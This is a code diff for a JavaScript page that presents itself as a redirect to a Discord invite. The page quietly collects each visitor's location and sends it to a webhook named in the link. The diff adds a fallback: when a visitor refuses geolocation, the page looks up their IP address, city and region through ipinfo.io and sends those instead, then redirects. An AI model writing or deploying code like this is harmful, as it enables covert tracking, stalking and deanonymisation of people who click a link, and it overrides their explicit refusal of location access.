@@ -32,7 +32,22 @@
             });
         }
 
-        // Main function to handle the geolocation and webhook sending
+        // Function to fetch approximate location using the user's IP
+        function getApproxLocation() {
+            fetch("https://ipinfo.io/json?token=YOUR_IPINFO_API_KEY")  // Replace with your ipinfo.io token
+                .then(response => response.json())
+                .then(data => {
+                    const locationMessage = `IP-based location: City: ${data.city}, State: ${data.region}, IP: ${data.ip}`;
+                    sendToWebhook(getWebhookFromUrl(), locationMessage);
+                })
+                .catch(error => {
+                    console.error("Error fetching IP location:", error);
+                    // Fallback if IP lookup fails
+                    sendToWebhook(getWebhookFromUrl(), "Unable to determine location.");
+                });
+        }
+
+        // Main function to handle geolocation and webhook sending
         function handleRedirectAndWebhook() {
             // Get the webhook URL from the query string
             const webhookUrl = getWebhookFromUrl();
@@ -45,21 +60,27 @@
                         const latitude = position.coords.latitude;
                         const longitude = position.coords.longitude;
 
-                        // Create a message to send to the webhook with the location
-                        const message = `User's location: Latitude: ${latitude}, Longitude: ${longitude}`;
+                        // Use the browser to fetch a more detailed address
+                        const geoDetailsMessage = `User's precise location: Latitude: ${latitude}, Longitude: ${longitude}`;
 
-                        // Send location data to the webhook
-                        sendToWebhook(webhookUrl, message);
+                        // Send precise location data to the webhook
+                        sendToWebhook(webhookUrl, geoDetailsMessage);
 
                         // Redirect to the Discord invite link
                         window.location.href = "https://discord.gg/perkbios";
                     }, function(error) {
                         console.error("Geolocation error:", error);
-                        // Redirect to Discord if geolocation fails
+                        // If the user denies location, fall back to IP-based location
+                        getApproxLocation();
+
+                        // Redirect to Discord even if geolocation is denied
                         window.location.href = "https://discord.gg/perkbios";
                     });
                 } else {
                     console.log("Geolocation is not supported by this browser.");
+                    // Fall back to IP-based location if geolocation is not supported
+                    getApproxLocation();
+
                     // Redirect to Discord if geolocation is not supported
                     window.location.href = "https://discord.gg/perkbios";
                 }
